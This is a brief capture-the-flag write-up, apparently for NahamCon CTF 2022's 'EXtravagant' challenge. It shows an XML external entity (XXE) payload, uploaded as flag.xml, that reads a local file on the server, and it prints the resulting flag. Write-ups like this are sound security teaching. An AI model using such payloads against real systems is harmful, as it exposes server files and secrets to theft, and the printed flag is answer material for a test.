
# EXtravagant

![EXtravagant.PNG](https://github.com/vichhika/CTF-Writeup/blob/main/NahamCon%20CTF%202022/EXtravagant/EXtravagant.png?raw=true)

# Exploitation

![Upload.png](https://github.com/vichhika/CTF-Writeup/blob/main/NahamCon%20CTF%202022/EXtravagant/Upload.png?raw=true)

We see this website allow to view XML. So we try to do XML injection via file upload. First we create file `flag.xml` and put this source code below and save.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///var/www/flag.txt"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```
Try to upload and view that xml file. we will get flag

# Flag

```
flag{E769ABB30EF8663D111066A720356B29}
```																																																																																					
